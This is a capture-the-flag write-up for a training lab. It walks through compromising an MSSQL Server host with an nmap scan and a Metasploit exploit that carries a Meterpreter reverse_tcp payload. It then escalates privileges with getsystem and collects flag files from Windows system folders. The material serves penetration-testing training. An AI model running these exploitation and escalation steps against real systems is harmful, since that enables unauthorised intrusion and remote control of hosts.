## Flag 1 Exploiting MSSQL Server
```
nmap -sV -sC -O target.ine.local
```

```
service postgresql start  
msfconsole -q
```

```
search type:exploit mssql
set payload windows/x64/meterpreter/reverse_tcp  
set RHOSTS target.ine.local  
run
```

```meterpreter
cd C:\\
dir
cat flag1.txt
```
## Flag 2 Windows Configuration Folder
```meterpreter
cd Windows\System32
dir /a:d
cd config
#Access denied
```
To list only the directories in the `System32` folder, use the following command: `dir /a:d` . This will filter the results and show only the directories.

```
getprivs
getsystem
```
`getprivs`: To view the privileges that the current user have.
`getsystem`: To elevate the privileges because if `SeImpersonatePrivilege` is present, `getsystem` is likely to succeed using Named Pipe Impersonation.

```
shell
dir
type flag2.txt
```
## Flag 3: Searching for Hidden File in System Directory

- Used recursive search for text files in C:\Windows\System32:

```meterpreter
dir C:\Windows\System32\*.txt /s /b
```

- **`/s`**: This switch instructs the command to search the specified directory and all its subdirectories recursively.
- **`/b`**: This switch uses "bare" format. It lists only the file path and name, excluding metadata like file size, date, time, and folder summaries.
## Flag 4
```
cd C:\Users\Administrator\Desktop
dir
type flag4.txt
```